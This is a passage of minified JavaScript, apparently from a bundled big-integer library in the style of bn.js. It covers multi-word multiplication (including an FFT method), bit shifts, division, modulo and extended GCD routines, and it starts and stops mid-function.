                $ = $ + Math.imul(We, Pt) | 0,
                ie = ie + Math.imul(We, Bt) | 0,
                re = re + Math.imul(nt, Dt) | 0,
                $ = $ + Math.imul(nt, Ft) | 0,
                $ = $ + Math.imul(je, Dt) | 0,
                ie = ie + Math.imul(je, Ft) | 0,
                re = re + Math.imul(qe, at) | 0,
                $ = $ + Math.imul(qe, ze) | 0,
                $ = $ + Math.imul(Ve, at) | 0,
                ie = ie + Math.imul(Ve, ze) | 0,
                re = re + Math.imul(Ze, ht) | 0,
                $ = $ + Math.imul(Ze, _t) | 0,
                $ = $ + Math.imul($e, ht) | 0,
                ie = ie + Math.imul($e, _t) | 0,
                re = re + Math.imul(Ie, Ye) | 0,
                $ = $ + Math.imul(Ie, it) | 0,
                $ = $ + Math.imul(Te, Ye) | 0,
                ie = ie + Math.imul(Te, it) | 0,
                re = re + Math.imul(ge, ut) | 0,
                $ = $ + Math.imul(ge, wt) | 0,
                $ = $ + Math.imul(Re, ut) | 0,
                ie = ie + Math.imul(Re, wt) | 0;
                var br = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (br >>> 26) | 0,
                br &= 67108863,
                re = Math.imul(ke, rt),
                $ = Math.imul(ke, dt),
                $ = $ + Math.imul(Me, rt) | 0,
                ie = Math.imul(Me, dt),
                re = re + Math.imul(et, ft) | 0,
                $ = $ + Math.imul(et, gt) | 0,
                $ = $ + Math.imul(tt, ft) | 0,
                ie = ie + Math.imul(tt, gt) | 0,
                re = re + Math.imul(_e, Ct) | 0,
                $ = $ + Math.imul(_e, Ot) | 0,
                $ = $ + Math.imul(Ce, Ct) | 0,
                ie = ie + Math.imul(Ce, Ot) | 0,
                re = re + Math.imul(ct, Pt) | 0,
                $ = $ + Math.imul(ct, Bt) | 0,
                $ = $ + Math.imul(vt, Pt) | 0,
                ie = ie + Math.imul(vt, Bt) | 0,
                re = re + Math.imul(Qe, Dt) | 0,
                $ = $ + Math.imul(Qe, Ft) | 0,
                $ = $ + Math.imul(We, Dt) | 0,
                ie = ie + Math.imul(We, Ft) | 0,
                re = re + Math.imul(nt, at) | 0,
                $ = $ + Math.imul(nt, ze) | 0,
                $ = $ + Math.imul(je, at) | 0,
                ie = ie + Math.imul(je, ze) | 0,
                re = re + Math.imul(qe, ht) | 0,
                $ = $ + Math.imul(qe, _t) | 0,
                $ = $ + Math.imul(Ve, ht) | 0,
                ie = ie + Math.imul(Ve, _t) | 0,
                re = re + Math.imul(Ze, Ye) | 0,
                $ = $ + Math.imul(Ze, it) | 0,
                $ = $ + Math.imul($e, Ye) | 0,
                ie = ie + Math.imul($e, it) | 0,
                re = re + Math.imul(Ie, ut) | 0,
                $ = $ + Math.imul(Ie, wt) | 0,
                $ = $ + Math.imul(Te, ut) | 0,
                ie = ie + Math.imul(Te, wt) | 0,
                re = re + Math.imul(ge, St) | 0,
                $ = $ + Math.imul(ge, Tt) | 0,
                $ = $ + Math.imul(Re, St) | 0,
                ie = ie + Math.imul(Re, Tt) | 0;
                var _r = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (_r >>> 26) | 0,
                _r &= 67108863,
                re = Math.imul(ke, ft),
                $ = Math.imul(ke, gt),
                $ = $ + Math.imul(Me, ft) | 0,
                ie = Math.imul(Me, gt),
                re = re + Math.imul(et, Ct) | 0,
                $ = $ + Math.imul(et, Ot) | 0,
                $ = $ + Math.imul(tt, Ct) | 0,
                ie = ie + Math.imul(tt, Ot) | 0,
                re = re + Math.imul(_e, Pt) | 0,
                $ = $ + Math.imul(_e, Bt) | 0,
                $ = $ + Math.imul(Ce, Pt) | 0,
                ie = ie + Math.imul(Ce, Bt) | 0,
                re = re + Math.imul(ct, Dt) | 0,
                $ = $ + Math.imul(ct, Ft) | 0,
                $ = $ + Math.imul(vt, Dt) | 0,
                ie = ie + Math.imul(vt, Ft) | 0,
                re = re + Math.imul(Qe, at) | 0,
                $ = $ + Math.imul(Qe, ze) | 0,
                $ = $ + Math.imul(We, at) | 0,
                ie = ie + Math.imul(We, ze) | 0,
                re = re + Math.imul(nt, ht) | 0,
                $ = $ + Math.imul(nt, _t) | 0,
                $ = $ + Math.imul(je, ht) | 0,
                ie = ie + Math.imul(je, _t) | 0,
                re = re + Math.imul(qe, Ye) | 0,
                $ = $ + Math.imul(qe, it) | 0,
                $ = $ + Math.imul(Ve, Ye) | 0,
                ie = ie + Math.imul(Ve, it) | 0,
                re = re + Math.imul(Ze, ut) | 0,
                $ = $ + Math.imul(Ze, wt) | 0,
                $ = $ + Math.imul($e, ut) | 0,
                ie = ie + Math.imul($e, wt) | 0,
                re = re + Math.imul(Ie, St) | 0,
                $ = $ + Math.imul(Ie, Tt) | 0,
                $ = $ + Math.imul(Te, St) | 0,
                ie = ie + Math.imul(Te, Tt) | 0;
                var wr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (wr >>> 26) | 0,
                wr &= 67108863,
                re = Math.imul(ke, Ct),
                $ = Math.imul(ke, Ot),
                $ = $ + Math.imul(Me, Ct) | 0,
                ie = Math.imul(Me, Ot),
                re = re + Math.imul(et, Pt) | 0,
                $ = $ + Math.imul(et, Bt) | 0,
                $ = $ + Math.imul(tt, Pt) | 0,
                ie = ie + Math.imul(tt, Bt) | 0,
                re = re + Math.imul(_e, Dt) | 0,
                $ = $ + Math.imul(_e, Ft) | 0,
                $ = $ + Math.imul(Ce, Dt) | 0,
                ie = ie + Math.imul(Ce, Ft) | 0,
                re = re + Math.imul(ct, at) | 0,
                $ = $ + Math.imul(ct, ze) | 0,
                $ = $ + Math.imul(vt, at) | 0,
                ie = ie + Math.imul(vt, ze) | 0,
                re = re + Math.imul(Qe, ht) | 0,
                $ = $ + Math.imul(Qe, _t) | 0,
                $ = $ + Math.imul(We, ht) | 0,
                ie = ie + Math.imul(We, _t) | 0,
                re = re + Math.imul(nt, Ye) | 0,
                $ = $ + Math.imul(nt, it) | 0,
                $ = $ + Math.imul(je, Ye) | 0,
                ie = ie + Math.imul(je, it) | 0,
                re = re + Math.imul(qe, ut) | 0,
                $ = $ + Math.imul(qe, wt) | 0,
                $ = $ + Math.imul(Ve, ut) | 0,
                ie = ie + Math.imul(Ve, wt) | 0,
                re = re + Math.imul(Ze, St) | 0,
                $ = $ + Math.imul(Ze, Tt) | 0,
                $ = $ + Math.imul($e, St) | 0,
                ie = ie + Math.imul($e, Tt) | 0;
                var sr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (sr >>> 26) | 0,
                sr &= 67108863,
                re = Math.imul(ke, Pt),
                $ = Math.imul(ke, Bt),
                $ = $ + Math.imul(Me, Pt) | 0,
                ie = Math.imul(Me, Bt),
                re = re + Math.imul(et, Dt) | 0,
                $ = $ + Math.imul(et, Ft) | 0,
                $ = $ + Math.imul(tt, Dt) | 0,
                ie = ie + Math.imul(tt, Ft) | 0,
                re = re + Math.imul(_e, at) | 0,
                $ = $ + Math.imul(_e, ze) | 0,
                $ = $ + Math.imul(Ce, at) | 0,
                ie = ie + Math.imul(Ce, ze) | 0,
                re = re + Math.imul(ct, ht) | 0,
                $ = $ + Math.imul(ct, _t) | 0,
                $ = $ + Math.imul(vt, ht) | 0,
                ie = ie + Math.imul(vt, _t) | 0,
                re = re + Math.imul(Qe, Ye) | 0,
                $ = $ + Math.imul(Qe, it) | 0,
                $ = $ + Math.imul(We, Ye) | 0,
                ie = ie + Math.imul(We, it) | 0,
                re = re + Math.imul(nt, ut) | 0,
                $ = $ + Math.imul(nt, wt) | 0,
                $ = $ + Math.imul(je, ut) | 0,
                ie = ie + Math.imul(je, wt) | 0,
                re = re + Math.imul(qe, St) | 0,
                $ = $ + Math.imul(qe, Tt) | 0,
                $ = $ + Math.imul(Ve, St) | 0,
                ie = ie + Math.imul(Ve, Tt) | 0;
                var dr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (dr >>> 26) | 0,
                dr &= 67108863,
                re = Math.imul(ke, Dt),
                $ = Math.imul(ke, Ft),
                $ = $ + Math.imul(Me, Dt) | 0,
                ie = Math.imul(Me, Ft),
                re = re + Math.imul(et, at) | 0,
                $ = $ + Math.imul(et, ze) | 0,
                $ = $ + Math.imul(tt, at) | 0,
                ie = ie + Math.imul(tt, ze) | 0,
                re = re + Math.imul(_e, ht) | 0,
                $ = $ + Math.imul(_e, _t) | 0,
                $ = $ + Math.imul(Ce, ht) | 0,
                ie = ie + Math.imul(Ce, _t) | 0,
                re = re + Math.imul(ct, Ye) | 0,
                $ = $ + Math.imul(ct, it) | 0,
                $ = $ + Math.imul(vt, Ye) | 0,
                ie = ie + Math.imul(vt, it) | 0,
                re = re + Math.imul(Qe, ut) | 0,
                $ = $ + Math.imul(Qe, wt) | 0,
                $ = $ + Math.imul(We, ut) | 0,
                ie = ie + Math.imul(We, wt) | 0,
                re = re + Math.imul(nt, St) | 0,
                $ = $ + Math.imul(nt, Tt) | 0,
                $ = $ + Math.imul(je, St) | 0,
                ie = ie + Math.imul(je, Tt) | 0;
                var nr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (nr >>> 26) | 0,
                nr &= 67108863,
                re = Math.imul(ke, at),
                $ = Math.imul(ke, ze),
                $ = $ + Math.imul(Me, at) | 0,
                ie = Math.imul(Me, ze),
                re = re + Math.imul(et, ht) | 0,
                $ = $ + Math.imul(et, _t) | 0,
                $ = $ + Math.imul(tt, ht) | 0,
                ie = ie + Math.imul(tt, _t) | 0,
                re = re + Math.imul(_e, Ye) | 0,
                $ = $ + Math.imul(_e, it) | 0,
                $ = $ + Math.imul(Ce, Ye) | 0,
                ie = ie + Math.imul(Ce, it) | 0,
                re = re + Math.imul(ct, ut) | 0,
                $ = $ + Math.imul(ct, wt) | 0,
                $ = $ + Math.imul(vt, ut) | 0,
                ie = ie + Math.imul(vt, wt) | 0,
                re = re + Math.imul(Qe, St) | 0,
                $ = $ + Math.imul(Qe, Tt) | 0,
                $ = $ + Math.imul(We, St) | 0,
                ie = ie + Math.imul(We, Tt) | 0;
                var lr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (lr >>> 26) | 0,
                lr &= 67108863,
                re = Math.imul(ke, ht),
                $ = Math.imul(ke, _t),
                $ = $ + Math.imul(Me, ht) | 0,
                ie = Math.imul(Me, _t),
                re = re + Math.imul(et, Ye) | 0,
                $ = $ + Math.imul(et, it) | 0,
                $ = $ + Math.imul(tt, Ye) | 0,
                ie = ie + Math.imul(tt, it) | 0,
                re = re + Math.imul(_e, ut) | 0,
                $ = $ + Math.imul(_e, wt) | 0,
                $ = $ + Math.imul(Ce, ut) | 0,
                ie = ie + Math.imul(Ce, wt) | 0,
                re = re + Math.imul(ct, St) | 0,
                $ = $ + Math.imul(ct, Tt) | 0,
                $ = $ + Math.imul(vt, St) | 0,
                ie = ie + Math.imul(vt, Tt) | 0;
                var fr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (fr >>> 26) | 0,
                fr &= 67108863,
                re = Math.imul(ke, Ye),
                $ = Math.imul(ke, it),
                $ = $ + Math.imul(Me, Ye) | 0,
                ie = Math.imul(Me, it),
                re = re + Math.imul(et, ut) | 0,
                $ = $ + Math.imul(et, wt) | 0,
                $ = $ + Math.imul(tt, ut) | 0,
                ie = ie + Math.imul(tt, wt) | 0,
                re = re + Math.imul(_e, St) | 0,
                $ = $ + Math.imul(_e, Tt) | 0,
                $ = $ + Math.imul(Ce, St) | 0,
                ie = ie + Math.imul(Ce, Tt) | 0;
                var ir = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (ir >>> 26) | 0,
                ir &= 67108863,
                re = Math.imul(ke, ut),
                $ = Math.imul(ke, wt),
                $ = $ + Math.imul(Me, ut) | 0,
                ie = Math.imul(Me, wt),
                re = re + Math.imul(et, St) | 0,
                $ = $ + Math.imul(et, Tt) | 0,
                $ = $ + Math.imul(tt, St) | 0,
                ie = ie + Math.imul(tt, Tt) | 0;
                var $t = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + ($t >>> 26) | 0,
                $t &= 67108863,
                re = Math.imul(ke, St),
                $ = Math.imul(ke, Tt),
                $ = $ + Math.imul(Me, St) | 0,
                ie = Math.imul(Me, Tt);
                var Nt = (de + re | 0) + (($ & 8191) << 13) | 0;
                return de = (ie + ($ >>> 13) | 0) + (Nt >>> 26) | 0,
                Nt &= 67108863,
                se[0] = er,
                se[1] = Xt,
                se[2] = pr,
                se[3] = or,
                se[4] = yr,
                se[5] = vr,
                se[6] = gr,
                se[7] = Sr,
                se[8] = br,
                se[9] = _r,
                se[10] = wr,
                se[11] = sr,
                se[12] = dr,
                se[13] = nr,
                se[14] = lr,
                se[15] = fr,
                se[16] = ir,
                se[17] = $t,
                se[18] = Nt,
                de !== 0 && (se[19] = de,
                U.length++),
                U
            };
            Math.imul || (ne = ae);
            function oe(ce, q, L) {
                L.negative = q.negative ^ ce.negative,
                L.length = ce.length + q.length;
                for (var U = 0, Z = 0, te = 0; te < L.length - 1; te++) {
                    var se = Z;
                    Z = 0;
                    for (var de = U & 67108863, re = Math.min(te, q.length - 1), $ = Math.max(0, te - ce.length + 1); $ <= re; $++) {
                        var ie = te - $
                          , ve = ce.words[ie] | 0
                          , ge = q.words[$] | 0
                          , Re = ve * ge
                          , Pe = Re & 67108863;
                        se = se + (Re / 67108864 | 0) | 0,
                        Pe = Pe + de | 0,
                        de = Pe & 67108863,
                        se = se + (Pe >>> 26) | 0,
                        Z += se >>> 26,
                        se &= 67108863
                    }
                    L.words[te] = de,
                    U = se,
                    se = Z
                }
                return U !== 0 ? L.words[te] = U : L.length--,
                L.strip()
            }
            function ue(ce, q, L) {
                var U = new fe;
                return U.mulp(ce, q, L)
            }
            w.prototype.mulTo = function(q, L) {
                var U, Z = this.length + q.length;
                return this.length === 10 && q.length === 10 ? U = ne(this, q, L) : Z < 63 ? U = ae(this, q, L) : Z < 1024 ? U = oe(this, q, L) : U = ue(this, q, L),
                U
            }
            ;
            function fe(ce, q) {
                this.x = ce,
                this.y = q
            }
            fe.prototype.makeRBT = function(q) {
                for (var L = new Array(q), U = w.prototype._countBits(q) - 1, Z = 0; Z < q; Z++)
                    L[Z] = this.revBin(Z, U, q);
                return L
            }
            ,
            fe.prototype.revBin = function(q, L, U) {
                if (q === 0 || q === U - 1)
                    return q;
                for (var Z = 0, te = 0; te < L; te++)
                    Z |= (q & 1) << L - te - 1,
                    q >>= 1;
                return Z
            }
            ,
            fe.prototype.permute = function(q, L, U, Z, te, se) {
                for (var de = 0; de < se; de++)
                    Z[de] = L[q[de]],
                    te[de] = U[q[de]]
            }
            ,
            fe.prototype.transform = function(q, L, U, Z, te, se) {
                this.permute(se, q, L, U, Z, te);
                for (var de = 1; de < te; de <<= 1)
                    for (var re = de << 1, $ = Math.cos(2 * Math.PI / re), ie = Math.sin(2 * Math.PI / re), ve = 0; ve < te; ve += re)
                        for (var ge = $, Re = ie, Pe = 0; Pe < de; Pe++) {
                            var Ie = U[ve + Pe]
                              , Te = Z[ve + Pe]
                              , Le = U[ve + Pe + de]
                              , Ze = Z[ve + Pe + de]
                              , $e = ge * Le - Re * Ze;
                            Ze = ge * Ze + Re * Le,
                            Le = $e,
                            U[ve + Pe] = Ie + Le,
                            Z[ve + Pe] = Te + Ze,
                            U[ve + Pe + de] = Ie - Le,
                            Z[ve + Pe + de] = Te - Ze,
                            Pe !== re && ($e = $ * ge - ie * Re,
                            Re = $ * Re + ie * ge,
                            ge = $e)
                        }
            }
            ,
            fe.prototype.guessLen13b = function(q, L) {
                var U = Math.max(L, q) | 1
                  , Z = U & 1
                  , te = 0;
                for (U = U / 2 | 0; U; U = U >>> 1)
                    te++;
                return 1 << te + 1 + Z
            }
            ,
            fe.prototype.conjugate = function(q, L, U) {
                if (!(U <= 1))
                    for (var Z = 0; Z < U / 2; Z++) {
                        var te = q[Z];
                        q[Z] = q[U - Z - 1],
                        q[U - Z - 1] = te,
                        te = L[Z],
                        L[Z] = -L[U - Z - 1],
                        L[U - Z - 1] = -te
                    }
            }
            ,
            fe.prototype.normalize13b = function(q, L) {
                for (var U = 0, Z = 0; Z < L / 2; Z++) {
                    var te = Math.round(q[2 * Z + 1] / L) * 8192 + Math.round(q[2 * Z] / L) + U;
                    q[Z] = te & 67108863,
                    te < 67108864 ? U = 0 : U = te / 67108864 | 0
                }
                return q
            }
            ,
            fe.prototype.convert13b = function(q, L, U, Z) {
                for (var te = 0, se = 0; se < L; se++)
                    te = te + (q[se] | 0),
                    U[2 * se] = te & 8191,
                    te = te >>> 13,
                    U[2 * se + 1] = te & 8191,
                    te = te >>> 13;
                for (se = 2 * L; se < Z; ++se)
                    U[se] = 0;
                O(te === 0),
                O((te & -8192) === 0)
            }
            ,
            fe.prototype.stub = function(q) {
                for (var L = new Array(q), U = 0; U < q; U++)
                    L[U] = 0;
                return L
            }
            ,
            fe.prototype.mulp = function(q, L, U) {
                var Z = 2 * this.guessLen13b(q.length, L.length)
                  , te = this.makeRBT(Z)
                  , se = this.stub(Z)
                  , de = new Array(Z)
                  , re = new Array(Z)
                  , $ = new Array(Z)
                  , ie = new Array(Z)
                  , ve = new Array(Z)
                  , ge = new Array(Z)
                  , Re = U.words;
                Re.length = Z,
                this.convert13b(q.words, q.length, de, Z),
                this.convert13b(L.words, L.length, ie, Z),
                this.transform(de, se, re, $, Z, te),
                this.transform(ie, se, ve, ge, Z, te);
                for (var Pe = 0; Pe < Z; Pe++) {
                    var Ie = re[Pe] * ve[Pe] - $[Pe] * ge[Pe];
                    $[Pe] = re[Pe] * ge[Pe] + $[Pe] * ve[Pe],
                    re[Pe] = Ie
                }
                return this.conjugate(re, $, Z),
                this.transform(re, $, Re, se, Z, te),
                this.conjugate(Re, se, Z),
                this.normalize13b(Re, Z),
                U.negative = q.negative ^ L.negative,
                U.length = q.length + L.length,
                U.strip()
            }
            ,
            w.prototype.mul = function(q) {
                var L = new w(null);
                return L.words = new Array(this.length + q.length),
                this.mulTo(q, L)
            }
            ,
            w.prototype.mulf = function(q) {
                var L = new w(null);
                return L.words = new Array(this.length + q.length),
                ue(this, q, L)
            }
            ,
            w.prototype.imul = function(q) {
                return this.clone().mulTo(q, this)
            }
            ,
            w.prototype.imuln = function(q) {
                O(typeof q == "number"),
                O(q < 67108864);
                for (var L = 0, U = 0; U < this.length; U++) {
                    var Z = (this.words[U] | 0) * q
                      , te = (Z & 67108863) + (L & 67108863);
                    L >>= 26,
                    L += Z / 67108864 | 0,
                    L += te >>> 26,
                    this.words[U] = te & 67108863
                }
                return L !== 0 && (this.words[U] = L,
                this.length++),
                this.length = q === 0 ? 1 : this.length,
                this
            }
            ,
            w.prototype.muln = function(q) {
                return this.clone().imuln(q)
            }
            ,
            w.prototype.sqr = function() {
                return this.mul(this)
            }
            ,
            w.prototype.isqr = function() {
                return this.imul(this.clone())
            }
            ,
            w.prototype.pow = function(q) {
                var L = ee(q);
                if (L.length === 0)
                    return new w(1);
                for (var U = this, Z = 0; Z < L.length && L[Z] === 0; Z++,
                U = U.sqr())
                    ;
                if (++Z < L.length)
                    for (var te = U.sqr(); Z < L.length; Z++,
                    te = te.sqr())
                        L[Z] !== 0 && (U = U.mul(te));
                return U
            }
            ,
            w.prototype.iushln = function(q) {
                O(typeof q == "number" && q >= 0);
                var L = q % 26, U = (q - L) / 26, Z = 67108863 >>> 26 - L << 26 - L, te;
                if (L !== 0) {
                    var se = 0;
                    for (te = 0; te < this.length; te++) {
                        var de = this.words[te] & Z
                          , re = (this.words[te] | 0) - de << L;
                        this.words[te] = re | se,
                        se = de >>> 26 - L
                    }
                    se && (this.words[te] = se,
                    this.length++)
                }
                if (U !== 0) {
                    for (te = this.length - 1; te >= 0; te--)
                        this.words[te + U] = this.words[te];
                    for (te = 0; te < U; te++)
                        this.words[te] = 0;
                    this.length += U
                }
                return this.strip()
            }
            ,
            w.prototype.ishln = function(q) {
                return O(this.negative === 0),
                this.iushln(q)
            }
            ,
            w.prototype.iushrn = function(q, L, U) {
                O(typeof q == "number" && q >= 0);
                var Z;
                L ? Z = (L - L % 26) / 26 : Z = 0;
                var te = q % 26
                  , se = Math.min((q - te) / 26, this.length)
                  , de = 67108863 ^ 67108863 >>> te << te
                  , re = U;
                if (Z -= se,
                Z = Math.max(0, Z),
                re) {
                    for (var $ = 0; $ < se; $++)
                        re.words[$] = this.words[$];
                    re.length = se
                }
                if (se !== 0)
                    if (this.length > se)
                        for (this.length -= se,
                        $ = 0; $ < this.length; $++)
                            this.words[$] = this.words[$ + se];
                    else
                        this.words[0] = 0,
                        this.length = 1;
                var ie = 0;
                for ($ = this.length - 1; $ >= 0 && (ie !== 0 || $ >= Z); $--) {
                    var ve = this.words[$] | 0;
                    this.words[$] = ie << 26 - te | ve >>> te,
                    ie = ve & de
                }
                return re && ie !== 0 && (re.words[re.length++] = ie),
                this.length === 0 && (this.words[0] = 0,
                this.length = 1),
                this.strip()
            }
            ,
            w.prototype.ishrn = function(q, L, U) {
                return O(this.negative === 0),
                this.iushrn(q, L, U)
            }
            ,
            w.prototype.shln = function(q) {
                return this.clone().ishln(q)
            }
            ,
            w.prototype.ushln = function(q) {
                return this.clone().iushln(q)
            }
            ,
            w.prototype.shrn = function(q) {
                return this.clone().ishrn(q)
            }
            ,
            w.prototype.ushrn = function(q) {
                return this.clone().iushrn(q)
            }
            ,
            w.prototype.testn = function(q) {
                O(typeof q == "number" && q >= 0);
                var L = q % 26
                  , U = (q - L) / 26
                  , Z = 1 << L;
                if (this.length <= U)
                    return !1;
                var te = this.words[U];
                return !!(te & Z)
            }
            ,
            w.prototype.imaskn = function(q) {
                O(typeof q == "number" && q >= 0);
                var L = q % 26
                  , U = (q - L) / 26;
                if (O(this.negative === 0, "imaskn works only with positive numbers"),
                this.length <= U)
                    return this;
                if (L !== 0 && U++,
                this.length = Math.min(U, this.length),
                L !== 0) {
                    var Z = 67108863 ^ 67108863 >>> L << L;
                    this.words[this.length - 1] &= Z
                }
                return this.strip()
            }
            ,
            w.prototype.maskn = function(q) {
                return this.clone().imaskn(q)
            }
            ,
            w.prototype.iaddn = function(q) {
                return O(typeof q == "number"),
                O(q < 67108864),
                q < 0 ? this.isubn(-q) : this.negative !== 0 ? this.length === 1 && (this.words[0] | 0) < q ? (this.words[0] = q - (this.words[0] | 0),
                this.negative = 0,
                this) : (this.negative = 0,
                this.isubn(q),
                this.negative = 1,
                this) : this._iaddn(q)
            }
            ,
            w.prototype._iaddn = function(q) {
                this.words[0] += q;
                for (var L = 0; L < this.length && this.words[L] >= 67108864; L++)
                    this.words[L] -= 67108864,
                    L === this.length - 1 ? this.words[L + 1] = 1 : this.words[L + 1]++;
                return this.length = Math.max(this.length, L + 1),
                this
            }
            ,
            w.prototype.isubn = function(q) {
                if (O(typeof q == "number"),
                O(q < 67108864),
                q < 0)
                    return this.iaddn(-q);
                if (this.negative !== 0)
                    return this.negative = 0,
                    this.iaddn(q),
                    this.negative = 1,
                    this;
                if (this.words[0] -= q,
                this.length === 1 && this.words[0] < 0)
                    this.words[0] = -this.words[0],
                    this.negative = 1;
                else
                    for (var L = 0; L < this.length && this.words[L] < 0; L++)
                        this.words[L] += 67108864,
                        this.words[L + 1] -= 1;
                return this.strip()
            }
            ,
            w.prototype.addn = function(q) {
                return this.clone().iaddn(q)
            }
            ,
            w.prototype.subn = function(q) {
                return this.clone().isubn(q)
            }
            ,
            w.prototype.iabs = function() {
                return this.negative = 0,
                this
            }
            ,
            w.prototype.abs = function() {
                return this.clone().iabs()
            }
            ,
            w.prototype._ishlnsubmul = function(q, L, U) {
                var Z = q.length + U, te;
                this._expand(Z);
                var se, de = 0;
                for (te = 0; te < q.length; te++) {
                    se = (this.words[te + U] | 0) + de;
                    var re = (q.words[te] | 0) * L;
                    se -= re & 67108863,
                    de = (se >> 26) - (re / 67108864 | 0),
                    this.words[te + U] = se & 67108863
                }
                for (; te < this.length - U; te++)
                    se = (this.words[te + U] | 0) + de,
                    de = se >> 26,
                    this.words[te + U] = se & 67108863;
                if (de === 0)
                    return this.strip();
                for (O(de === -1),
                de = 0,
                te = 0; te < this.length; te++)
                    se = -(this.words[te] | 0) + de,
                    de = se >> 26,
                    this.words[te] = se & 67108863;
                return this.negative = 1,
                this.strip()
            }
            ,
            w.prototype._wordDiv = function(q, L) {
                var U = this.length - q.length
                  , Z = this.clone()
                  , te = q
                  , se = te.words[te.length - 1] | 0
                  , de = this._countBits(se);
                U = 26 - de,
                U !== 0 && (te = te.ushln(U),
                Z.iushln(U),
                se = te.words[te.length - 1] | 0);
                var re = Z.length - te.length, $;
                if (L !== "mod") {
                    $ = new w(null),
                    $.length = re + 1,
                    $.words = new Array($.length);
                    for (var ie = 0; ie < $.length; ie++)
                        $.words[ie] = 0
                }
                var ve = Z.clone()._ishlnsubmul(te, 1, re);
                ve.negative === 0 && (Z = ve,
                $ && ($.words[re] = 1));
                for (var ge = re - 1; ge >= 0; ge--) {
                    var Re = (Z.words[te.length + ge] | 0) * 67108864 + (Z.words[te.length + ge - 1] | 0);
                    for (Re = Math.min(Re / se | 0, 67108863),
                    Z._ishlnsubmul(te, Re, ge); Z.negative !== 0; )
                        Re--,
                        Z.negative = 0,
                        Z._ishlnsubmul(te, 1, ge),
                        Z.isZero() || (Z.negative ^= 1);
                    $ && ($.words[ge] = Re)
                }
                return $ && $.strip(),
                Z.strip(),
                L !== "div" && U !== 0 && Z.iushrn(U),
                {
                    div: $ || null,
                    mod: Z
                }
            }
            ,
            w.prototype.divmod = function(q, L, U) {
                if (O(!q.isZero()),
                this.isZero())
                    return {
                        div: new w(0),
                        mod: new w(0)
                    };
                var Z, te, se;
                return this.negative !== 0 && q.negative === 0 ? (se = this.neg().divmod(q, L),
                L !== "mod" && (Z = se.div.neg()),
                L !== "div" && (te = se.mod.neg(),
                U && te.negative !== 0 && te.iadd(q)),
                {
                    div: Z,
                    mod: te
                }) : this.negative === 0 && q.negative !== 0 ? (se = this.divmod(q.neg(), L),
                L !== "mod" && (Z = se.div.neg()),
                {
                    div: Z,
                    mod: se.mod
                }) : (this.negative & q.negative) !== 0 ? (se = this.neg().divmod(q.neg(), L),
                L !== "div" && (te = se.mod.neg(),
                U && te.negative !== 0 && te.isub(q)),
                {
                    div: se.div,
                    mod: te
                }) : q.length > this.length || this.cmp(q) < 0 ? {
                    div: new w(0),
                    mod: this
                } : q.length === 1 ? L === "div" ? {
                    div: this.divn(q.words[0]),
                    mod: null
                } : L === "mod" ? {
                    div: null,
                    mod: new w(this.modn(q.words[0]))
                } : {
                    div: this.divn(q.words[0]),
                    mod: new w(this.modn(q.words[0]))
                } : this._wordDiv(q, L)
            }
            ,
            w.prototype.div = function(q) {
                return this.divmod(q, "div", !1).div
            }
            ,
            w.prototype.mod = function(q) {
                return this.divmod(q, "mod", !1).mod
            }
            ,
            w.prototype.umod = function(q) {
                return this.divmod(q, "mod", !0).mod
            }
            ,
            w.prototype.divRound = function(q) {
                var L = this.divmod(q);
                if (L.mod.isZero())
                    return L.div;
                var U = L.div.negative !== 0 ? L.mod.isub(q) : L.mod
                  , Z = q.ushrn(1)
                  , te = q.andln(1)
                  , se = U.cmp(Z);
                return se < 0 || te === 1 && se === 0 ? L.div : L.div.negative !== 0 ? L.div.isubn(1) : L.div.iaddn(1)
            }
            ,
            w.prototype.modn = function(q) {
                O(q <= 67108863);
                for (var L = (1 << 26) % q, U = 0, Z = this.length - 1; Z >= 0; Z--)
                    U = (L * U + (this.words[Z] | 0)) % q;
                return U
            }
            ,
            w.prototype.idivn = function(q) {
                O(q <= 67108863);
                for (var L = 0, U = this.length - 1; U >= 0; U--) {
                    var Z = (this.words[U] | 0) + L * 67108864;
                    this.words[U] = Z / q | 0,
                    L = Z % q
                }
                return this.strip()
            }
            ,
            w.prototype.divn = function(q) {
                return this.clone().idivn(q)
            }
            ,
            w.prototype.egcd = function(q) {
                O(q.negative === 0),
                O(!q.isZero());
                var L = this
                  , U = q.clone();
                L.negative !== 0 ? L = L.umod(q) : L = L.clone();
                for (var Z = new w(1), te = new w(0), se = new w(0), de = new w(1), re = 0; L.isEven() && U.isEven(); )
                    L.iushrn(1),
                    U.iushrn(1),
                    ++re;
                for (var $ = U.clone(), ie = L.clone(); !L.isZero(); ) {
                    for (var ve = 0, ge = 1; (L.words[0] & ge) === 0 && ve < 26; ++ve,
                    ge <<= 1)
                        ;
                    if (ve > 0)
                        for (L.iushrn(ve); ve-- > 0; )
                            (Z.isOdd() || te.isOdd()) && (Z.iadd($),
                            te.isub(ie)),
                            Z.iushrn(1),
                            te.iushrn(1);
                    for (var Re = 0, Pe = 1; (U.words[0] & Pe) === 0 && Re < 26; ++Re,
                    Pe <<= 1)
                        ;
                    if (Re > 0)
                        for (U.iushrn(Re); Re-- > 0; )
                            (se.isOdd() || de.isOdd()) && (se.iadd($),
                            de.isub(ie)),
                            se.iushrn(1),
                            de.iushrn(1);
                    L.cmp(U) >= 0 ? (L.isub(U),
                    Z.isub(se),
                    te.isub(de)) : (U.isub(L),
                    se.isub(Z),
                    de.isub(te))
                }
                return {
                    a: se,
                    b: de,
                    gcd: U.iushln(re)
                }
            }
            ,
            w.prototype._invmp = function(q) {
                O(q.negative === 0),
                O(!q.isZero());
                var L = this
                  , U = q.clone();
                L.negative !== 0 ? L = L.umod(q) : L = L.clone();
                for (var Z = new w(1), te = new w(0), se = U.clone(); L.cmpn(1) > 0 && U.cmpn(1) > 0; ) {
